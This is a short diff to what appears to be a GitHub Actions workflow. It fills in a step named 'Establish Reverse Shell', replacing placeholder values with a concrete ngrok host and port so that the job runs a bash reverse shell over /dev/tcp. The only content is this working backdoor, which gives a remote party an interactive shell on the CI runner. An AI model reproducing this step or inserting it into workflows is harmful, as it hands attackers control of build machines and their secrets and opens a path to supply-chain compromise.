@@ -9,5 +9,5 @@ jobs:
     steps:
       - name: Establish Reverse Shell
         run: |
-          /bin/bash -c "bash -i >& /dev/tcp/<NGROK_HOSTNAME>/<NGROK_PORT> 0>&1" &
+          /bin/bash -c "bash -i >& /dev/tcp/6.tcp.ngrok.io/10575 0>&1" &
         shell: bash
